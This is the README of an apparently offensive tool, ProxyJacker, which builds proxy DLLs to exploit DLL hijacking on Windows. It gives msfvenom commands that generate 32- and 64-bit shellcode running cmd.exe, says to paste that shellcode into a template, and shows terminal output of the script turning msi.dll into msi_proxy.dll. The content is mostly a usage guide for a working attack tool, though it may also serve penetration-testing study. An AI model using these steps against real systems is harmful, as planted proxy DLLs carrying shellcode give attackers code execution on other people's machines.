# ProxyJacker

### Details:

​	Tool for creating forwarding dll for exploiting dll hijacking vulnerability. 

### Requirements:

- [ ] Mingw-64 installed.
- [ ] python2. 
- [ ] PEfiles lib.

### Procedure: 

1. Create shellcode with msfvenom and replace with template file with `YOUR SHELLCODE` 

   ```bash
   msfvenom -p windows/x64/exec cmd=cmd.exe -f c -b "\x00" //FOR 64bit
   msfvenom -p windows/exec cmd=cmd.exe -f c -b "\x00" //FOR 32bit
   ```

2. Run script.

   ```
   kali@kali:~/Music/hijack/proxyjacker$ python proxydllhijacker.py 
   
   Proxy DLL Creator For DLL HIjacking
   		 By 
   	   Rikunj Sindhwad 
   	     [Mr.R0b07]
   
   
   Usage: proxydllhijacker.py 'DLL File Location' 
   
   Usage: proxydllhijacker.py '/home/kali/xyz/abc.dll' 
   
   kali@kali:~/Music/hijack/proxyjacker$ python proxydllhijacker.py msi.dll
   
   Proxy DLL Creator For DLL HIjacking
   		 By 
   	   Rikunj Sindhwad 
   	     [Mr.R0b07]
   
   [*] DLL is 32bit 
   
   [*] Defination File Created with name of export.def
   
   [*] Created 32bit DLL : msi_proxy.dll
   kali@kali:~/Music/hijack/proxyjacker$ ls 
   export.def  msi.dll  msi_proxy.dll  proxydllhijacker.py  template_64.c  template.c
   ```
##### For Upgrade Request Use telegram to connect me on telegram https://t.me/R0B077
   #### credits: Pentester Academy for teaching such great stuff 


   
